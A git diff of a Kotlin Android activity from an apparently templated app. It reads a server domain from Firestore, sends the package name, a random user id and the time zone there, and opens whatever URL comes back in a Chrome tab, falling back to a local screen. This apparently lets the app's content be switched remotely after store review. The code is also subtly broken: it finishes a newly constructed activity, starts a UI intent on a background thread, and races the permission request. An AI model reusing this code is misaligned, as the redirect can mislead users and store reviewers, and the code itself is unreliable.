@@ -1,125 +1,165 @@
 package com.template
 
+import android.Manifest
 import android.content.Context
 import android.content.Intent
 import android.content.SharedPreferences
+import android.content.pm.PackageManager
 import android.net.ConnectivityManager
 import android.net.Uri
-import androidx.appcompat.app.AppCompatActivity
+import android.os.Build
 import android.os.Bundle
-import android.util.Log
-import android.widget.ProgressBar
+import android.webkit.WebView
+import android.widget.Toast
+import androidx.activity.result.contract.ActivityResultContracts
+import androidx.annotation.RequiresApi
+import androidx.appcompat.app.AppCompatActivity
 import androidx.browser.customtabs.CustomTabColorSchemeParams
 import androidx.browser.customtabs.CustomTabsIntent
 import androidx.core.content.ContextCompat
-import java.util.*
+import androidx.lifecycle.lifecycleScope
+import com.google.firebase.firestore.FirebaseFirestore
+import com.google.firebase.ktx.Firebase
+import com.google.firebase.messaging.ktx.messaging
+import kotlinx.coroutines.Dispatchers
+import kotlinx.coroutines.launch
+import java.util.TimeZone
+import java.util.UUID
 
 class LoadingActivity : AppCompatActivity() {
 
-    private var domenFromFirebase = ""
-    private var link = ""
+    @RequiresApi(Build.VERSION_CODES.M)
+    private val requestPermissionLauncher = registerForActivityResult(
+        ActivityResultContracts.RequestPermission(),
+    ) { isGranted: Boolean ->
+        if (isGranted) {
+            Toast.makeText(this, "Notifications permission granted", Toast.LENGTH_SHORT).show()
+        } else {
+            Toast.makeText(this, "Notifications permission is not granted", Toast.LENGTH_SHORT).show()
+        }
+    }
+
     private var isFirestoreUrlNullOrEmpty = false
     private var isFinalUrlExist = false
 
+    private val finalUrlPreferences by lazy {
+        getSharedPreferences(APP_PREFERENCES, Context.MODE_PRIVATE)
+    }
 
+    private val domenFromFirebase by lazy {
+        readDataFromFirestore((application as App).firestoreDb)
+    }
+
+    @RequiresApi(Build.VERSION_CODES.M)
     override fun onCreate(savedInstanceState: Bundle?) {
         super.onCreate(savedInstanceState)
         setContentView(R.layout.activity_loading)
 
-        val finalUrlPreferences = getSharedPreferences(APP_PREFERENCES, Context.MODE_PRIVATE)
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
+            checkNotificationPermission()
+        } else {
+            startFirestoreCheck()
+        }
+    }
 
-        if ((getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager)
-                .isDefaultNetworkActive
-        ) {
-            if (finalUrlPreferences.contains(URL)) {
+    @RequiresApi(Build.VERSION_CODES.M)
+    private fun startFirestoreCheck() {
+        val isNetworkActive =
+            (getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager)
+                .activeNetwork
+
+        if (isNetworkActive == null) {
+            startActivity(Intent(this, MainActivity::class.java))
+            return
+        }
+
+        if (finalUrlPreferences.contains(URL)) {
+            val url = finalUrlPreferences.getString(URL, "")
+            startChromeCustomTabs(url!!)
+        }
+
+        if (isFirestoreUrlNullOrEmpty) {
+            preferencesEdit(
+                finalUrlPreferences,
+                IS_FIRESTORE_URL_NULL_OR_EMPTY,
+                isFirestoreUrlNullOrEmpty
+            )
+            startActivity(Intent(this, MainActivity::class.java))
+        } else {
+            if (isFinalUrlExist) {
+                preferencesEdit(finalUrlPreferences, IS_FINAL_URL_EXIST, isFinalUrlExist)
                 val url = finalUrlPreferences.getString(URL, "")
-                customTabsStart(url!!)
+                startChromeCustomTabs(url!!)
+            } else {
+                readDataFromFirestore((application as App).firestoreDb)
             }
+        }
+    }
 
-            if (isFirestoreUrlNullOrEmpty) {
+    private fun readDataFromFirestore(firestoreDb: FirebaseFirestore) {
+        firestoreDb
+            .collection("database")
+            .document("check")
+            .get()
+            .addOnSuccessListener { document ->
+                if (document != null) {
+                    isFirestoreUrlNullOrEmpty = false
+                    preferencesEdit(
+                        finalUrlPreferences,
+                        IS_FIRESTORE_URL_NULL_OR_EMPTY,
+                        isFirestoreUrlNullOrEmpty
+                    )
+                    val domenFromFirebase = document.get("link").toString()
+                    startByUrl(domenFromFirebase)
+                } else {
+                    isFirestoreUrlNullOrEmpty = true
+                    preferencesEdit(
+                        finalUrlPreferences,
+                        IS_FIRESTORE_URL_NULL_OR_EMPTY,
+                        isFirestoreUrlNullOrEmpty
+                    )
+                    startActivity(Intent(this, MainActivity::class.java))
+                }
+            }
+    }
+
+    private fun startByUrl(domenFromFirebase: String) {
+        val userAgent = WebView(this).settings.userAgentString
+        lifecycleScope.launch(Dispatchers.IO) {
+            val retofitClient = RetrofitService
+                .getClient(domenFromFirebase, userAgent)
+                .create(RetrofitClient::class.java)
+
+            val call = retofitClient.getUrl(
+                packageName = packageName,
+                userId = "${UUID.randomUUID()}",
+                timeZone = TimeZone.getDefault().id
+            )
+
+            val response = call.execute()
+
+            if (response.isSuccessful) {
+                isFinalUrlExist = true
+                val url = response.body()
+                finalUrlPreferences.edit()
+                    .putString(URL, url)
+                    .putBoolean(IS_FINAL_URL_EXIST, isFinalUrlExist)
+                    .apply()
+
+                startChromeCustomTabs(url!!)
+            } else {
+                isFirestoreUrlNullOrEmpty = true
                 preferencesEdit(
                     finalUrlPreferences,
                     IS_FIRESTORE_URL_NULL_OR_EMPTY,
                     isFirestoreUrlNullOrEmpty
                 )
-                startActivity(Intent(this, MainActivity::class.java))
-            } else {
-                if (isFinalUrlExist) {
-                    preferencesEdit(finalUrlPreferences, IS_FINAL_URL_EXIST, isFinalUrlExist)
-                    val url = finalUrlPreferences.getString(URL, "")
-                    customTabsStart(url!!)
-                } else {
-                    (application as App).firestoreDb.collection("database")
-                        .document("check")
-                        .get().addOnSuccessListener { document ->
-                            if (document != null) {
-                                isFirestoreUrlNullOrEmpty = false
-                                preferencesEdit(
-                                    finalUrlPreferences,
-                                    IS_FIRESTORE_URL_NULL_OR_EMPTY,
-                                    isFirestoreUrlNullOrEmpty
-                                )
-                                domenFromFirebase = document.get("link").toString()
-                                Log.d("look at", domenFromFirebase)
-                            } else {
-                                isFirestoreUrlNullOrEmpty = true
-                                preferencesEdit(
-                                    finalUrlPreferences,
-                                    IS_FIRESTORE_URL_NULL_OR_EMPTY,
-                                    isFirestoreUrlNullOrEmpty
-                                )
-                                startActivity(Intent(this, MainActivity::class.java))
-                            }
-                        }
-
-                    link = "$domenFromFirebase/?" +
-                            "packageid=$packageName" +
-                            "&usserid=${UUID.randomUUID()}" +
-                            "&getz=${TimeZone.getDefault()}" +
-                            "&getr=utm_source=google-play&utm_medium=organic"
-                    Log.d("look at", link)
-
-                    val retofitClient = RetrofitService.getClient(link).create(
-                        RetrofitClient::class.java
-                    )
-                    val response = retofitClient.getUrl()
-
-                    if (response.isSuccessful) {
-                        isFinalUrlExist = true
-                        val url = response.body().toString()
-                        Log.d("look at", url)
-                        finalUrlPreferences.edit()
-                            .putString(URL, url)
-                            .putBoolean(IS_FINAL_URL_EXIST, isFinalUrlExist)
-                            .apply()
-
-                        customTabsStart(url)
-                    } else {
-                        isFirestoreUrlNullOrEmpty = true
-                        preferencesEdit(
-                            finalUrlPreferences,
-                            IS_FIRESTORE_URL_NULL_OR_EMPTY,
-                            isFirestoreUrlNullOrEmpty
-                        )
-                        startActivity(Intent(this, MainActivity::class.java))
-                    }
-                }
+                startActivity(Intent(this@LoadingActivity, MainActivity::class.java))
             }
-        } else {
-            startActivity(Intent(this, MainActivity::class.java))
-        }
-//        val userAgent =
-
-        val progressBar = findViewById<ProgressBar>(R.id.loading_progress_bar)
-        var progress = 0
-        while (true) {
-            if (progress == 10) progress = 0
-            progressBar.progress = progress
-            progress++
         }
     }
 
-    private fun customTabsStart(url: String) {
+    private fun startChromeCustomTabs(url: String) {
         val customTabsIntent = CustomTabsIntent.Builder()
             .setDefaultColorSchemeParams(
                 CustomTabColorSchemeParams.Builder()
@@ -128,6 +168,7 @@ class LoadingActivity : AppCompatActivity() {
                     ).build()
             ).build()
         customTabsIntent.launchUrl(this, Uri.parse(url))
+        LoadingActivity().finish()
     }
 
     private fun preferencesEdit(
@@ -140,8 +181,22 @@ class LoadingActivity : AppCompatActivity() {
             .apply()
     }
 
-    private fun checkPermission() {
 
+    private fun checkNotificationPermission() {
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
+            if (ContextCompat.checkSelfPermission(
+                    this,
+                    Manifest.permission.POST_NOTIFICATIONS
+                ) ==
+                PackageManager.PERMISSION_GRANTED
+            ) {
+                Firebase.messaging
+                startFirestoreCheck()
+            } else {
+                requestPermissionLauncher.launch(Manifest.permission.POST_NOTIFICATIONS)
+                startFirestoreCheck()
+            }
+        }
     }
 
     companion object {
